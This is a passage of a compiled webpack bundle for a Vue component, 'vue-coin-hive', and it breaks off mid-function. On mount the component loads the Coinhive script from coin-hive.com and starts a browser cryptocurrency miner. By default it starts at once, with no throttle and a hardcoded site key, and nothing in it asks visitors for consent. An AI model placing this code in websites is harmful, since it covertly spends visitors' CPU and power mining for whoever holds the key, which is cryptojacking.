(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["VueCoinHive"] = factory();
	else
		root["VueCoinHive"] = factory();
})(this, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = ".";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 6);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

// need to use require instead of import (changes from babel 5 to 6)
var Component = __webpack_require__(2);
module.exports = Component;

Component.install = function (Vue) {
  return Vue.component(Component.name, Component);
};
Component.version = "0.0.8";

// Install by default if using the script tag
if (typeof window !== 'undefined' && window.Vue) {
  window.Vue.use(Component);
}
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyY1xcaW5kZXguanMiXSwibmFtZXMiOlsiQ29tcG9uZW50IiwicmVxdWlyZSIsIm1vZHVsZSIsImV4cG9ydHMiLCJpbnN0YWxsIiwiVnVlIiwiY29tcG9uZW50IiwibmFtZSIsInZlcnNpb24iLCJwcm9jY2VzcyIsImVudiIsIlZFUlNJT04iLCJ3aW5kb3ciLCJ1c2UiXSwibWFwcGluZ3MiOiJBQUFBO0FBQ0EsSUFBTUEsWUFBWUMsUUFBUSxpQkFBUixDQUFsQjtBQUNBQyxPQUFPQyxPQUFQLEdBQWlCSCxTQUFqQjs7QUFFQUEsVUFBVUksT0FBVixHQUFvQjtBQUFBLFNBQU9DLElBQUlDLFNBQUosQ0FBY04sVUFBVU8sSUFBeEIsRUFBOEJQLFNBQTlCLENBQVA7QUFBQSxDQUFwQjtBQUNBQSxVQUFVUSxPQUFWLEdBQW9CQyxTQUFTQyxHQUFULENBQWFDLE9BQWpDOztBQUVBO0FBQ0EsSUFBSSxPQUFPQyxNQUFQLEtBQWtCLFdBQWxCLElBQWlDQSxPQUFPUCxHQUE1QyxFQUFpRDtBQUMvQ08sU0FBT1AsR0FBUCxDQUFXUSxHQUFYLENBQWViLFNBQWY7QUFDRCIsImZpbGUiOiJpbmRleC5qcyIsInNvdXJjZVJvb3QiOiJDOi9Vc2Vycy9TaGluL0Rlc2t0b3AvdnVlLWNvaW5oaXZlIiwic291cmNlc0NvbnRlbnQiOlsiLy8gbmVlZCB0byB1c2UgcmVxdWlyZSBpbnN0ZWFkIG9mIGltcG9ydCAoY2hhbmdlcyBmcm9tIGJhYmVsIDUgdG8gNilcbmNvbnN0IENvbXBvbmVudCA9IHJlcXVpcmUoJy4vQ29tcG9uZW50LnZ1ZScpXG5tb2R1bGUuZXhwb3J0cyA9IENvbXBvbmVudFxuXG5Db21wb25lbnQuaW5zdGFsbCA9IFZ1ZSA9PiBWdWUuY29tcG9uZW50KENvbXBvbmVudC5uYW1lLCBDb21wb25lbnQpXG5Db21wb25lbnQudmVyc2lvbiA9IHByb2NjZXNzLmVudi5WRVJTSU9OXG5cbi8vIEluc3RhbGwgYnkgZGVmYXVsdCBpZiB1c2luZyB0aGUgc2NyaXB0IHRhZ1xuaWYgKHR5cGVvZiB3aW5kb3cgIT09ICd1bmRlZmluZWQnICYmIHdpbmRvdy5WdWUpIHtcbiAgd2luZG93LlZ1ZS51c2UoQ29tcG9uZW50KVxufVxuIl19

/***/ }),
/* 1 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_load_script__ = __webpack_require__(5);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_load_script___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_0_load_script__);
//
//
//


/* harmony default export */ __webpack_exports__["default"] = ({
  name: 'vue-coin-hive',
  props: {
    start: {
      type: Boolean,
      default: true,
      required: false
    },
    startMode: {
      type: String,
      default: 'IF_EXCLUSIVE_TAB',
      required: false
    },
    siteKey: {
      type: String,
      default: 'SF4YQtgkNYmwR21W8NzKwixVdHB8wlDf',
      required: false
    },
    userName: {
      type: String,
      default: null,
      required: false
    },
    threads: {
      type: Number,
      default: 2,
      required: false
    },
    throttle: {
      type: Number,
      default: 0,
      required: false
    },
    enableFound: {
      type: Boolean,
      default: true,
      required: false
    },
    enableAccepted: {
      type: Boolean,
      default: true,
      required: false
    },
    enableUpdatesPerSecond: {
      type: Boolean,
      default: true,
      required: false
    },
    proxy: {
      type: Array,
      default: null,
      required: false
    }
  },
  mounted: function mounted() {
    var _this = this;

    __WEBPACK_IMPORTED_MODULE_0_load_script___default()('https://coin-hive.com/lib/coinhive.min.js', function () {
      if (_this.proxy) {
        var proxies = _this.proxy.reduce(function (acc, curr, i) {
          if (!(i % 8)) {
            acc.push(_this.proxy.slice(i, i + 8));
          }
          return acc;
        }, []);
        CoinHive.CONFIG.WEBSOCKET_SHARDS = proxies;
      }
      if (_this.siteKey && _this.userName) {
        _this.miner = new CoinHive.User(_this.siteKey, _this.userName);
      } else if (_this.siteKey) {
        _this.miner = new CoinHive.Anonymous(_this.siteKey);
      }
      _this.CoinHive = CoinHive;
      if (!_this.miner.isRunning() && _this.start) {
        _this.startMiner();
      }
    });
  },
  data: function data() {
    return {
      miner: null,
      CoinHive: null
    };
  },

  methods: {
    startMiner: function startMiner() {
      var _this2 = this;
      console.log('start Miner')

      if (this.miner && !this.miner.isRunning()) {
        var mode = this.getStartMode(this.startMode);
        this.miner.start(mode);
        this.miner.setNumThreads(this.threads);
        this.miner.setThrottle(this.throttle);

        if (this.enableFound) {
          this.miner.on('found', function (x) {
            return _this2.$emit('found', x);
          });
        }
        if (this.enableAccepted) {
          this.miner.on('accepted', function (x) {
            return _this2.$emit('accepted', x);
          });
        }
        // Update stats once per second
        if (this.enableUpdatesPerSecond) {
          setInterval(function () {
            var hashesPerSecond = _this2.miner.getHashesPerSecond();
            var totalHashes = _this2.miner.getTotalHashes();
            var acceptedHashes = _this2.miner.getAcceptedHashes();
            _this2.$emit('getHashesPerSecond', { hashesPerSecond: hashesPerSecond, totalHashes: totalHashes, acceptedHashes: acceptedHashes });
          }, 1000);
        }
      }
    },
    stopMiner: function stopMiner() {
      if (this.miner && this.miner.isRunning()) {
        this.miner.stop();
      }
    },
    getStartMode: function getStartMode(type) {
      if (type === 'IF_EXCLUSIVE_TAB') {
        return this.CoinHive.IF_EXCLUSIVE_TAB;
      } else if (type === 'FORCE_EXCLUSIVE_TAB') {
        return this.CoinHive.FORCE_EXCLUSIVE_TAB;
      } else {
        return this.CoinHive.FORCE_MULTI_TAB;
      }
    }
  },
  watch: {
    start: function start(value) {
      if (value) {
        this.startMiner();
      } else {
        this.stopMiner();
      }
    }
  }
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyY1xcQ29tcG9uZW50LnZ1ZSJdLCJuYW1lcyI6WyJsb2FkU2NyaXB0IiwibmFtZSIsInByb3BzIiwic3RhcnQiLCJ0eXBlIiwiQm9vbGVhbiIsImRlZmF1bHQiLCJyZXF1aXJlZCIsInN0YXJ0TW9kZSIsIlN0cmluZyIsInNpdGVLZXkiLCJ1c2VyTmFtZSIsInRocmVhZHMiLCJOdW1iZXIiLCJ0aHJvdHRsZSIsImVuYWJsZUZvdW5kIiwiZW5hYmxlQWNjZXB0ZWQiLCJlbmFibGVVcGRhdGVzUGVyU2Vjb25kIiwicHJveHkiLCJBcnJheSIsIm1vdW50ZWQiLCJwcm94aWVzIiwicmVkdWNlIiwiYWNjIiwiY3VyciIsImkiLCJwdXNoIiwic2xpY2UiLCJDb2luSGl2ZSIsIkNPTkZJRyIsIldFQlNPQ0tFVF9TSEFSRFMiLCJtaW5lciIsIlVzZXIiLCJBbm9ueW1vdXMiLCJpc1J1bm5pbmciLCJzdGFydE1pbmVyIiwiZGF0YSIsIm1ldGhvZHMiLCJtb2RlIiwiZ2V0U3RhcnRNb2RlIiwic2V0TnVtVGhyZWFkcyIsInNldFRocm90dGxlIiwib24iLCJ4IiwiJGVtaXQiLCJzZXRJbnRlcnZhbCIsImhhc2hlc1BlclNlY29uZCIsImdldEhhc2hlc1BlclNlY29uZCIsInRvdGFsSGFzaGVzIiwiZ2V0VG90YWxIYXNoZXMiLCJhY2NlcHRlZEhhc2hlcyIsImdldEFjY2VwdGVkSGFzaGVzIiwic3RvcE1pbmVyIiwic3RvcCIsIklGX0VYQ0xVU0lWRV9UQUIiLCJGT1JDRV9FWENMVVNJVkVfVEFCIiwiRk9SQ0VfTVVMVElfVEFCIiwid2F0Y2giLCJ2YWx1ZSJdLCJtYXBwaW5ncyI6IkFBQUE7QUFDQTtBQUNBOztBQUVBLE9BQU9BLFVBQVAsTUFBdUIsYUFBdkI7QUFDQSxlQUFlO0FBQ2JDLFFBQU0sZUFETztBQUViQyxTQUFPO0FBQ0xDLFdBQU87QUFDTEMsWUFBTUMsT0FERDtBQUVMQyxlQUFTLElBRko7QUFHTEMsZ0JBQVU7QUFITCxLQURGO0FBTUxDLGVBQVc7QUFD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QWM0QixlQUFyQjtBQUNEO0FBQ0Y7QUF0Q00sR0FsRkk7QUEwSGJDLFNBQU87QUFDTHRELFNBREssaUJBQ0V1RCxLQURGLEVBQ1M7QUFDWixVQUFJQSxLQUFKLEVBQVc7QUFDVCxhQUFLdkIsVUFBTDtBQUNELE9BRkQsTUFFTztBQUNMLGFBQUtpQixTQUFMO0FBQ0Q7QUFDRjtBQVBJO0FBMUhNLENBQWYiLCJmaWxlIjoiQ29tcG9uZW50LnZ1ZSIsInNvdXJjZVJvb3QiOiJDOi9Vc2Vycy9TaGluL0Rlc2t0b3AvdnVlLWNvaW5oaXZlIiwic291cmNlc0NvbnRlbnQiOlsiLy9cbi8vXG4vL1xuXG5pbXBvcnQgbG9hZFNjcmlwdCBmcm9tICdsb2FkLXNjcmlwdCdcbmV4cG9ydCBkZWZhdWx0IHtcbiAgbmFtZTogJ3Z1ZS1jb2luLWhpdmUnLFxuICBwcm9wczoge1xuICAgIHN0YXJ0OiB7XG4gICAgICB0eXBlOiBCb29sZWFuLFxuICAgICAgZGVmYXVsdDogdHJ1ZSxcbiAgICAgIHJlcXVpcmVkOiBmYWxzZSxcbiAgICB9LFxuICAgIHN0YXJ0TW9kZToge1xuICAgICAgdHlwZTogU3RyaW5nLFxuICAgICAgZGVmYXVsdDogJ0lGX0VYQ0xVU0lWRV9UQUInLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgc2l0ZUtleToge1xuICAgICAgdHlwZTogU3RyaW5nLFxuICAgICAgZGVmYXVsdDogJ1NGNFlRdGdrTlltd1IyMVc4TnpLd2l4VmRIQjh3bERmJyxcbiAgICAgIHJlcXVpcmVkOiBmYWxzZSxcbiAgICB9LFxuICAgIHVzZXJOYW1lOiB7XG4gICAgICB0eXBlOiBTdHJpbmcsXG4gICAgICBkZWZhdWx0OiBudWxsLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgdGhyZWFkczoge1xuICAgICAgdHlwZTogTnVtYmVyLFxuICAgICAgZGVmYXVsdDogMixcbiAgICAgIHJlcXVpcmVkOiBmYWxzZSxcbiAgICB9LFxuICAgIHRocm90dGxlOiB7XG4gICAgICB0eXBlOiBOdW1iZXIsXG4gICAgICBkZWZhdWx0OiAwLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgZW5hYmxlRm91bmQ6IHtcbiAgICAgIHR5cGU6IEJvb2xlYW4sXG4gICAgICBkZWZhdWx0OiB0cnVlLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgZW5hYmxlQWNjZXB0ZWQ6IHtcbiAgICAgIHR5cGU6IEJvb2xlYW4sXG4gICAgICBkZWZhdWx0OiB0cnVlLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgIH0sXG4gICAgZW5hYmxlVXBkYXRlc1BlclNlY29uZDoge1xuICAgICAgdHlwZTogQm9vbGVhbixcbiAgICAgIGRlZmF1bHQ6IHRydWUsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgfSxcbiAgICBwcm94eToge1xuICAgICAgdHlwZTogQXJyYXksXG4gICAgICBkZWZhdWx0OiBudWxsLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlXG4gICAgfVxuICB9LFxuICBtb3VudGVkICgpIHtcbiAgICBsb2FkU2NyaXB0KCdodHRwczovL2NvaW4taGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcycsICgpID0+IHtcbiAgICAgIGlmICh0aGlzLnByb3h5KSB7XG4gICAgICAgIGNvbnN0IHByb3hpZXMgPSB0aGlzLnByb3h5LnJlZHVjZSgoYWNjLCBjdXJyLCBpKSA9PiB7XG4gICAgICAgICAgaWYgKCEoaSAlIDgpKSB7XG4gICAgICAgICAgICBhY2MucHVzaCh0aGlzLnByb3h5LnNsaWNlKGksIGkgKyA4KSlcbiAgICAgICAgICB9XG4gICAgICAgICAgcmV0dXJuIGFjY1xuICAgICAgICB9LCBbXSlcbiAgICAgICAgQ29pbkhpdmUuQ09ORklHLldFQlNPQ0tFVF9TSEFSRFMgPSBwcm94aWVzXG4gICAgICB9XG4gICAgICBpZiAodGhpcy5zaXRlS2V5ICYmIHRoaXMudXNlck5hbWUpIHtcbiAgICAgICAgdGhpcy5taW5lciA9IG5ldyBDb2luSGl2ZS5Vc2VyKHRoaXMuc2l0ZUtleSwgdGhpcy51c2VyTmFtZSlcbiAgICAgIH0gZWxzZSBpZiAodGhpcy5zaXRlS2V5KSB7XG4gICAgICAgIHRoaXMubWluZXIgPSBuZXcgQ29pbkhpdmUuQW5vbnltb3VzKHRoaXMuc2l0ZUtleSlcbiAgICAgIH1cbiAgICAgIHRoaXMuQ29pbkhpdmUgPSBDb2luSGl2ZVxuICAgICAgaWYgKCF0aGlzLm1pbmVyLmlzUnVubmluZygpICYmIHRoaXMuc3RhcnQpIHtcbiAgICAgICAgdGhpcy5zdGFydE1pbmVyKClcbiAgICAgIH1cbiAgICB9KVxuICB9LFxuICBkYXRhICgpIHtcbiAgICByZXR1cm4ge1xuICAgICAgbWluZXI6IG51bGwsXG4gICAgICBDb2luSGl2ZTogbnVsbCxcbiAgICB9XG4gIH0sXG4gIG1ldGhvZHM6IHtcbiAgICBzdGFydE1pbmVyICgpIHtcbiAgICAgIGlmICh0aGlzLm1pbmVyICYmICF0aGlzLm1pbmVyLmlzUnVubmluZygpKSB7XG4gICAgICAgIGNvbnN0IG1vZGUgPSB0aGlzLmdldFN0YXJ0TW9kZSh0aGlzLnN0YXJ0TW9kZSlcbiAgICAgICAgdGhpcy5taW5lci5zdGFydChtb2RlKVxuICAgICAgICB0aGlzLm1pbmVyLnNldE51bVRocmVhZHModGhpcy50aHJlYWRzKVxuICAgICAgICB0aGlzLm1pbmVyLnNldFRocm90dGxlKHRoaXMudGhyb3R0bGUpXG5cbiAgICAgICAgaWYgKHRoaXMuZW5hYmxlRm91bmQpIHtcbiAgICAgICAgICB0aGlzLm1pbmVyLm9uKCdmb3VuZCcsICh4KSA9PiB0aGlzLiRlbWl0KCdmb3VuZCcsIHgpKVxuICAgICAgICB9XG4gICAgICAgIGlmICh0aGlzLmVuYWJsZUFjY2VwdGVkKSB7XG4gICAgICAgICAgdGhpcy5taW5lci5vbignYWNjZXB0ZWQnLCAoeCkgPT4gdGhpcy4kZW1pdCgnYWNjZXB0ZWQnLCB4KSlcbiAgICAgICAgfVxuICAgICAgICAvLyBVcGRhdGUgc3RhdHMgb25jZSBwZXIgc2Vjb25kXG4gICAgICAgIGlmICh0aGlzLmVuYWJsZVVwZGF0ZXNQZXJTZWNvbmQpIHtcbiAgICAgICAgICBzZXRJbnRlcnZhbCgoKSA9PiB7XG4gICAgICAgICAgICBjb25zdCBoYXNoZXNQZXJTZWNvbmQgPSB0aGlzLm1pbmVyLmdldEhhc2hlc1BlclNlY29uZCgpXG4gICAgICAgICAgICBjb25zdCB0b3RhbEhhc2hlcyA9IHRoaXMubWluZXIuZ2V0VG90YWxIYXNoZXMoKVxuICAgICAgICAgICAgY29uc3QgYWNjZXB0ZWRIYXNoZXMgPSB0aGlzLm1pbmVyLmdldEFjY2VwdGVkSGFzaGVzKClcbiAgICAgICAgICAgIHRoaXMuJGVtaXQoJ2dldEhhc2hlc1BlclNlY29uZCcsIHsgaGFzaGVzUGVyU2Vjb25kLCB0b3RhbEhhc2hlcywgYWNjZXB0ZWRIYXNoZXMgfSlcbiAgICAgICAgICB9LCAxMDAwKVxuICAgICAgICB9XG4gICAgICB9XG4gICAgfSxcbiAgICBzdG9wTWluZXIgKCkge1xuICAgICAgaWYgKHRoaXMubWluZXIgJiYgdGhpcy5taW5lci5pc1J1bm5pbmcoKSkge1xuICAgICAgICB0aGlzLm1pbmVyLnN0b3AoKVxuICAgICAgfVxuICAgIH0sXG4gICAgZ2V0U3RhcnRNb2RlKHR5cGUpIHtcbiAgICAgIGlmICh0eXBlID09PSAnSUZfRVhDTFVTSVZFX1RBQicpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMuQ29pbkhpdmUuSUZfRVhDTFVTSVZFX1RBQlxuICAgICAgfSBlbHNlIGlmICh0eXBlID09PSAnRk9SQ0VfRVhDTFVTSVZFX1RBQicpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMuQ29pbkhpdmUuRk9SQ0VfRVhDTFVTSVZFX1RBQlxuICAgICAgfSBlbHNlIHtcbiAgICAgICAgcmV0dXJuIHRoaXMuQ29pbkhpdmUuRk9SQ0VfTVVMVElfVEFCXG4gICAgICB9XG4gICAgfVxuICB9LFxuICB3YXRjaDoge1xuICAgIHN0YXJ0ICh2YWx1ZSkge1xuICAgICAgaWYgKHZhbHVlKSB7XG4gICAgICAgIHRoaXMuc3RhcnRNaW5lcigpXG4gICAgICB9IGVsc2Uge1xuICAgICAgICB0aGlzLnN0b3BNaW5lcigpXG4gICAgICB9XG4gICAgfSxcbiAgfSxcbn1cbiJdfQ==

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

var Component = __webpack_require__(3)(
  /* script */
  __webpack_require__(1),
  /* template */
  __webpack_require__(4),
  /* scopeId */
  null,
  /* cssModules */
  null
)

module.exports = Component.exports


/***/ }),
/* 3 */
/***/ (function(module, exports) {

module.exports = function normalizeComponent (
  rawScriptExports,
  compiledTemplate,
  scopeId,
  cssModules
) {
  var esModule
  var scriptExports = rawScriptExports = rawScriptExports || {}

  // ES6 modules interop
  var type = typeof rawScriptExports.default
  if (type === 'object' || type === 'function') {
    esModule = rawScriptExports
    scriptExports = rawScriptExports.default
  }

  // Vue.extend constructor export interop
  var options = typeof scriptExports === 'function'
    ? scriptExports.options
    : scriptExports

  // render functions
  if (compiledTemplate) {
    options.render = compiledTemplate.render
    options.staticRenderFns = compiledTemplate.staticRenderFns
  }

  // scopedId
  if (scopeId) {
    options._scopeId = scopeId
  }

  // inject cssModules
  if (cssModules) {
    var computed = options.computed || (options.computed = {})
    Object.keys(cssModules).forEach(function (key) {
      var module = cssModules[key]
      computed[key] = function () { return module }
    })
  }

  return {
    esModule: esModule,
    exports: scriptExports,
    options: options
  }
}


/***/ }),
/* 4 */
/***/ (function(module, exports) {

module.exports={render:function (){var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;
  return _c("div")
},staticRenderFns: []}

/***/ }),
/* 5 */
/***/ (function(module, exports) {


module.exports = function load (src, opts, cb) {
  var head = document.head || document.getElementsByTagName('head')[0]
  var script = document.createElement('script')

  if (typeof opts === 'function') {
    cb = opts
    opts = {}
  }

  opts = opts || {}
  cb = cb || function() {}

  script.type = opts.type || 'text/javascript'
  script.charset = opts.charset || 'utf8';
  script.async = 'async' in opts ? !!opts.async : true
  script.src = src

  if (opts.attrs) {
    setAttributes(script, opts.attrs)
  }

  if (opts.text) {
    script.text = '' + opts.text
  }

  var onend = 'onload' in script ? stdOnEnd : ieOnEnd
  onend(script, cb)

  // some good legacy browsers (firefox) fail the 'in' detection above
  // so as a fallback we always set onload
  // old IE will ignore this and new IE will set onload
  if (!script.onload) {
    stdOnEnd(script, cb);
  }

  head.appendChild(script)
}

function setAttributes(script, attrs) {
  for (var attr in attrs) {
    script.setAttribute(attr, attrs[attr]);
  }
}

function stdOnEnd (script, cb) {
  script.onload = function () {
    this.onerror = this.onload = null
    cb(null, script)
  }
  script.onerror = function () {
    // this.onload = null here is necessary
    // because even IE9 works not like others
    this.onerror = this.onload = null
    cb(new Error('Failed to load ' + this.src), script)
  }
}

function ieOnEnd (script, cb) {
  script.onreadystatechange = function () {
    if (this.readyState != 'complete' && this.readyState != 'loaded') return
